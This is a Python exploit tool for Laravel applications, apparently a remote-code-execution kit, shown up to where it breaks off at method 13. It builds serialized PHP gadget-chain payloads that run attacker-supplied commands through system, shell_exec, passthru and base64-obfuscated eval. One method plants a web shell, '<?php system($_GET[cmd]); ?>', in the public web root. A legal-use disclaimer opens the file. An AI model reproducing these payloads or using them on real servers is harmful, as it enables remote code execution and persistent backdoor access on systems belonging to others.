#!/usr/bin/env python3

# DISCLAIMER:
# This tool is for educational purposes and authorized penetration testing only.
# Unauthorized access to systems you do not own or have permission to test is illegal.

from rich.console import Console
from rich.panel import Panel
from rich.spinner import Spinner
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.table import Table
from Crypto import Random
from Crypto.Cipher import AES
from hashlib import sha256
from Crypto.Util.Padding import pad
import hmac
import base64
import json
import argparse
import requests
from signal import signal, SIGINT
from sys import exit
import time

console = Console()

# Colorful banner with vibrant colors
banner = """
[bold bright_red]
 ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚£∂‚£∂‚£∂‚£∂‚£∂‚£∂‚£§‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£Ä‚¢†‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚†É‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£æ‚£ø‚£ø‚°Ä‚†ª‚†ø‚£ø‚†ø‚£ø‚£ø‚£ø‚†è‚£∞‚£ø‚£ø‚£∑‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£æ‚£ø‚£ø‚£ø‚£ø‚£∂‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†Ä‚†ª‚£ø‚£ø‚£ø‚£ø‚£∑‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚†õ‚£â‚£≠‚£ô‚¢ª‚£Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£¥‚£∂‚£§‚£â‚†õ‚£õ‚£â‚†Å‚†Ä‚†Ä‚¢Ä‚£§‚£¥‚£¶‚£§‚£Ä‚£∂‚°Ü‚£æ‚£ø‚£ø‚£ø‚£Ø‚†õ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°è‚†Ä‚†Ä‚£∞‚†ü‚†â‚†â‚†ô‚¢ø‚£ø‚£ø‚£á‚¢ª‚£ø‚£ø‚£ø‚£ø‚†Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚£ø‚£ø‚£ø‚£ø‚£ø‚°ü‚†Ä‚†Ä‚†Ä‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£¶‚°ô‚†ø‚£ø‚†ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ø‚¢ã‚£©‚£≠‚£â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∞‚£ø‚£ø‚£ø‚£ø‚£∑‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£¥‚°æ‚£ø‚£ø‚°õ‚¢ã‚†â‚£†‚£Ñ‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚†ü‚£â‚£§‚£∂‚£§‚£§‚°Ä‚†Ä‚†Ä‚£¥‚£ø‚†ü‚†Å‚£©‚£ø‚£ø‚£ø‚£ø‚£ø‚£ª‚£∑‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ª‚£ø‚¢á‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°Ü‚†∫‚†ø‚†ã‚¢Ä‚£æ‚£ø‚°ø‚¢´‚£æ‚£ø‚†ü‚¢Æ‚£ù‚†ø‚£∑‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£∂‚£≥‚£æ‚£∑‚°Ñ‚†Ä‚†à‚¢ø‚¢∏‚£ø‚£ø‚£ø‚°ø‚£´‚£∂‚£ø‚£ø‚£ø‚£∑‚£Ñ‚¢ª‚°ø‚¢ã‚£¥‚£ø‚£ø‚†ü‚£†‚£¥‚°ø‚†∑‚£ü‚£Ø‚£§‚£∂‚°∂‚£∂‚£Ñ‚°Ä‚†Ä‚£Ä‚£Ä‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£†‚£¥‚£æ‚°ø‚†É‚†à‚†õ‚¢ø‚£¶‚£Ä‚£à‚°à‚¢ø‚£ø‚°ü‚£º‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚£õ‚£É‚£Ä‚£ò‚†ø‚†ü‚¢£‚£æ‚£ø‚°ø‚†É‚£¥‚£ø‚£ø‚£ø‚£ø‚£ø‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£æ‚£º‚°ø‚†ã‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚†ø‚£∏‚†ß‚°Ñ‚†ª‚†Å‚£ø‚£ø‚£ø‚£ø‚¢è‚£¥‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£Ñ‚¢ª‚°ü‚†ã‚†Ä‚£º‚£ø‚£ø‚£ø‚†ã‚†â‚†µ‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚¢ã‚£∑‚£ø‚£¶‚°Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚£º‚£ø‚†ã‚†Ä‚¢†‚£∂‚£∂‚£∂‚£æ‚£ø‚£ø‚£ø‚£ø‚£∑‚°Ñ‚£∂‚£∂‚£Ü‚£ª‚£ø‚£ø‚¢Ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£á‚†Å‚£Ä‚£†‚£¥‚£Æ‚¢ª‚†á‚†Ä‚£∑‚°Ñ‚†Ä‚†Ä‚†π‚£ø‚£ø‚£∑‚£ø‚£ø‚£ø‚£ø‚£∑‚£§‚°Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚°á‚†Ä‚¢∞‚£Ø‚£Ω‚†â‚†â‚¢©‚£ç‚£â‚£â‚£©‚£≠‚£•‚£≠‚£ç‚£ª‚£•‚£≠‚£≠‚£ú‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚¢õ‚°∏‚¢ø‚£ø‚£ø‚°ø‚†Ä‚†Ä‚†Ä‚¢π‚£∑‚£Ä‚£Ä‚†Ä‚†Ä‚†Å‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ü
‚†Ä‚†Ä‚¢Ä‚£º‚†ø‚†É‚†Ä‚¢∏‚£ø‚°á‚†Ä‚¢∏‚£ø‚†ª‚†ü‚†ø‚†ø‚†ø‚†ø‚¢ø‚£ø‚£ø‚†ã‚†õ‚£ª‚£≠‚£¥‚£∂‚£Ñ‚†â‚†õ‚†ø‚†ü‚¢´‚£æ‚£ø‚£ø‚£Ü‚£Ä‚°à‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†õ‚†â‚†Ä‚†Ä‚†Ä‚¢ò‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£†‚°¥‚†ü‚†õ‚†Å‚†Ä‚†Ä‚¢∏‚£ø‚°ß‚†Ä‚£æ‚£ø‚°Ä‚†Ä‚¢†‚£º‚°ª‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†é‚£ø‚†ø‚†ü‚†É‚£Ä‚£¥‚£ø‚£ø‚†à‚£ô‚°ª‚†ø‚†É‚¢æ‚£∑‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ü
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ø‚°á‚†Ä‚¢ø‚£ø‚°á‚†Ä‚£º‚£ø‚°á‚†â‚†ô‚†õ‚†ã‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£æ‚°õ‚†ª‚£ø‚°á‚†Ä‚£ø‚£ß‚†Ä‚†Ä‚†ò‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚£ø‚£ø‚†ø‚†ø‚†É‚†Ä‚¢†‚£§‚£¥‚°Ü
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚£ø‚°á‚¢∏‚£ø‚°á‚†Ä‚£ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚£†‚†æ‚†õ‚¢ø‚£ø‚£∑‚£ø‚£ø‚£ø‚£ß‚†π‚†É‚†Ä‚†à‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£ø‚£ø‚£ø‚†á‚†Ä‚†Ä‚†Ä‚†Ä‚£º‚£ø‚£ø‚†É
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£†‚£ø‚†á‚¢∏‚£∂‚°Ö‚¢ê‚°ø‚†è‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚£ø‚£∑‚°å‚†ø‚†ø‚†ø‚†ø‚†ø‚†ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢π‚°è‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£§‚£ø‚£ø‚†ã‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ú‚†ã‚†Ä‚†Ä‚†Ä‚¢ª‚£ß‚†ò‚£ø‚£¶‚†Ä‚†Ä‚¢†‚£ø‚£ø‚£ø‚£ø‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Å‚†Ä‚†Ä‚†Ä‚¢Ä‚£º‚£ø‚†ü‚†Å‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£¥‚°è‚†Ä‚†ò‚¢ø‚£ß‚†Ä‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£∂‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†í‚†õ‚†ã‚†Å‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°æ‚†ü‚†Ä‚†Ä‚†Ä‚¢∞‚£ø‚†Ü‚¢∏‚£ø‚£ø‚£ø‚£ø‚¢ø‚£ø‚£ß‚£§‚£∂‚£∂‚£¶‚£§‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°æ‚†ã‚†Ä‚¢∏‚£ø‚£ø‚°ø‚£±‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚£§‚£†‚£§‚£§‚£§‚£§‚£∂‚£∂‚£§‚£Ñ‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†Ä‚†Ä‚†Ä‚†à‚£ø‚£ø‚¢ß‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚†ø‚†ø‚£∑‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚¢ø‚†á‚¢ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚¢ã‚£â‚†â‚†ª‚†ã‚†Å‚†Ä‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ª‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚†ã‚¢∞‚£ø‚£ø‚£ß‚£¶‚°Ä‚£Ä‚£¥‚£∂‚£§‚£¥‚†Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†â‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚†õ‚†ø‚†ø‚†ø‚†ø‚†ø‚†õ‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
[/bold bright_red]

[bold bright_red]‚ñë‚ñà‚ñë‚ñë‚ñë‚ñà‚ñÄ‚ñà‚ñë‚ñà‚ñÄ‚ñÑ‚ñë‚ñà‚ñÄ‚ñà‚ñë‚ñà‚ñÄ‚ñÄ‚ñë‚ñà‚ñë‚ñà‚ñë‚ñà‚ñÄ‚ñà‚ñë‚ñà‚ñë‚ñë‚ñë‚ñà‚ñÄ‚ñà‚ñë‚ñÄ‚ñà‚ñÄ‚ñë‚ñÄ‚ñà‚ñÄ[/bold bright_red]
[bold bright_yellow]‚ñë‚ñà‚ñë‚ñë‚ñë‚ñà‚ñÄ‚ñà‚ñë‚ñà‚ñÄ‚ñÑ‚ñë‚ñà‚ñÄ‚ñà‚ñë‚ñà‚ñÄ‚ñÄ‚ñë‚ñÑ‚ñÄ‚ñÑ‚ñë‚ñà‚ñÄ‚ñÄ‚ñë‚ñà‚ñë‚ñë‚ñë‚ñà‚ñë‚ñà‚ñë‚ñë‚ñà‚ñë‚ñë‚ñë‚ñà‚ñë[/bold bright_yellow]
[bold bright_green]‚ñë‚ñÄ‚ñÄ‚ñÄ‚ñë‚ñÄ‚ñë‚ñÄ‚ñë‚ñÄ‚ñë‚ñÄ‚ñë‚ñÄ‚ñë‚ñÄ‚ñë‚ñÄ‚ñÄ‚ñÄ‚ñë‚ñÄ‚ñë‚ñÄ‚ñë‚ñÄ‚ñë‚ñë‚ñë‚ñÄ‚ñÄ‚ñÄ‚ñë‚ñÄ‚ñÄ‚ñÄ‚ñë‚ñÄ‚ñÄ‚ñÄ‚ñë‚ñë‚ñÄ‚ñë[/bold bright_green]
[bold bright_cyan]                                      V 05.25 [/bold bright_cyan]

[bold bright_cyan]‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê[/bold bright_cyan]
[yellow]‚ö° Powered by: [/yellow][bold bright_red]Taha Ishaq[/bold bright_red]
[yellow]üõ† Developer: [/yellow][bold bright_cyan]Taha Ishaq[/bold bright_cyan]
[yellow]üîç GitHub: [/yellow][bold bright_cyan]https://github.com/taha-isaq]
[bold bright_cyan]‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê[/bold bright_cyan]
"""

# Warning panel
def display_warnings():
    warning_text = (
        "[bold bright_red]‚ö† LEGAL WARNING ‚ö†[/bold bright_red]\n"
        "[white]This tool is for [bold white]EDUCATIONAL PURPOSES[/bold white] and [bold white]AUTHORIZED TESTING[/bold white] only.[/white]\n"
        "[white]Unauthorized access to systems without explicit permission is [bold bright_red]ILLEGAL[/bold bright_red].[/white]\n"
        "[white]Use responsibly and comply with all applicable laws.[/white]\n\n"
        "[bold bright_yellow]‚ö† SECURITY NOTICE ‚ö†[/bold bright_yellow]\n"
        "[white]Ensure the target system is under your control or you have written consent.[/white]\n"
        "[white]Misuse may lead to [bold bright_red]severe legal consequences[/bold bright_red].[/white]\n\n"
        "[bold bright_yellow]‚ö† NETWORK WARNING ‚ö†[/bold bright_yellow]\n"
        "[white]Rapid requests may trigger rate-limiting or server blocks. Use --skip-ssl if SSL issues occur.[/white]"
    )
    console.print(Panel(warning_text, title="[bold bright_red]üö® IMPORTANT üö®[/bold bright_red]", border_style="bright_red", padding=(1, 2)))

def generate_payload(cmd, key, method=1, verbose=False):
    payload_type = "Deserialization"
    if method in [7, 8, 12, 13, 16]:
        payload_type = "Command Injection"
    elif method in [9, 14]:
        payload_type = "Shell Drop"
    elif method == 15:
        payload_type = "XXE"
    elif method == 17:
        payload_type = "Deserialization (PHPGGC)"
    if verbose:
        console.print(f"[bold bright_yellow]üì¶ Generating payload: [white]{cmd}[/white] (Method [cyan]{method}[/cyan], Type: [cyan]{payload_type}[/cyan])[/bold bright_yellow]")
        console.print(f"[bold bright_yellow]üìö Payload Source: [cyan]Inspired by PayloadsAllTheThings/PHPGGC[/cyan][/bold bright_yellow]")
    if method == 1:
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 2:
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"' + "\x00" + '*' + "\x00" + 'listeners";a:1:{s:' + str(len(cmd)) + ':"' + cmd + '";a:1:{i:0;s:6:"system";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 3:
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:39:"Illuminate\\Notifications\\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:' + str(len(cmd)) + ':"' + cmd + '";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:6:"system";}}}'
    elif method == 4:
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\\Validation\\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 5:
        payload_decoded = 'O:45:"Illuminate\\Queue\\SerializableClosure":1:{s:10:"' + "\x00" + '*' + "\x00" + 'closure";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 6:
        payload_decoded = 'O:40:"Illuminate\\Auth\\Access\\Gate":1:{s:10:"' + "\x00" + '*' + "\x00" + 'abilities";a:1:{s:' + str(len(cmd)) + ':"' + cmd + '";s:6:"system";}}'
    elif method == 7:
        cmd = f"eval(base64_decode('{base64.b64encode(cmd.encode()).decode()}')) 2>/dev/null"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 8:
        cmd = f"shell_exec('{cmd}') 2>/dev/null"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 9:
        cmd = f"file_put_contents('/var/www/public/shell.php', '<?php system($_GET[cmd]); ?>')"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 10:
        payload_decoded = 'O:36:"Illuminate\\Database\\Eloquent\\Model":1:{s:10:"' + "\x00" + '*' + "\x00" + 'attributes";a:1:{s:' + str(len(cmd)) + ':"' + cmd + '";s:6:"system";}}'
    elif method == 11:
        payload_decoded = 'O:31:"Illuminate\\Support\\MessageBag":1:{s:8:"' + "\x00" + '*' + "\x00" + 'messages";a:1:{s:' + str(len(cmd)) + ':"' + cmd + '";s:6:"system";}}'
    elif method == 12:
        cmd = f"passthru('{cmd}') 2>/dev/null"
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 13:
